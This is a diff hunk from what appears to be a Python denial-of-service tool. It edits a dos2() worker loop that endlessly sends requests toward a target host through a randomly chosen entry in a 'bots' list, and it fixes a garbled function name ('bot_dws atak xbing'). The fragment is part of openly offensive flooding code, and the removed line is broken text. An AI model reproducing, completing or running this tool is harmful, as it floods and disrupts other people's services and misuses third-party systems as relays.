@@ -70,7 +70,7 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_dws atak xbing(random.choice(bots)+"http://"+host)
+		bot_dwsatakxbing(random.choice(bots)+"http://"+host)
 		w.task_done()
 
 
